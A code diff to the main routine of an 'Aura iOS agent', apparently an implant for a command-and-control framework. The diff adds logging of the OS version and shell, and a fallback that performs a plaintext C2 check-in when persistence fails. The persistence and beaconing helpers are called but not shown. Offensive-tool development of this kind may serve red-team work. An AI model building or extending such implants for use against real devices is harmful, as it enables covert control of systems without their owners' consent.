@@ -18,7 +18,9 @@ int main(int argc, const char * argv[]) {
         signal(SIGINT, handleSignal);
         signal(SIGHUP, handleSignal);
 
-        NSLog(@"👋 Hello from the Aura iOS agent!");
+        NSLog(@"👋 Hello from the Aura iOS agent! -- you're on iOS %@", [[NSProcessInfo processInfo] operatingSystemVersionString]);
+        NSLog(@"Current shell: %@", [[[NSProcessInfo processInfo] environment] objectForKey:@"SHELL"] ?: @"Unknown shell");
+
 
         if ([SystemInfoHelper agentIsInstalled]) {
             NSLog(@"🎃 Aura agent is already installed...");
@@ -31,12 +33,14 @@ int main(int argc, const char * argv[]) {
                 /// Attempt to persist
                 BOOL agentInstallSuccess = [SystemInfoHelper persistAgent];
                 if (!agentInstallSuccess && ![SystemInfoHelper agentIsInstalled]) {
-                    NSLog(@"🤯 Error installing the Aura agent....");
-                    exit(1);
+                    NSLog(@"Aura cannot persist here.... falling back to stand-alone check-in");
+                    /// Perform the HTTP plaintext check-in
+                    [C2CheckIn performPlaintextCheckin];
+                } else {
+                    // We don't need this anymore ;)
+                    NSLog(@"Aura agent persisted -- exiting....");
+                    exit(0);
                 }
-
-                // We don't need this anymore ;)
-                exit(0);
             } else {
                 NSLog(@"⚠️ WARNING: Executing the Aura agent stand-alone -- without persistence");
                 /// Perform the HTTP plaintext check-in
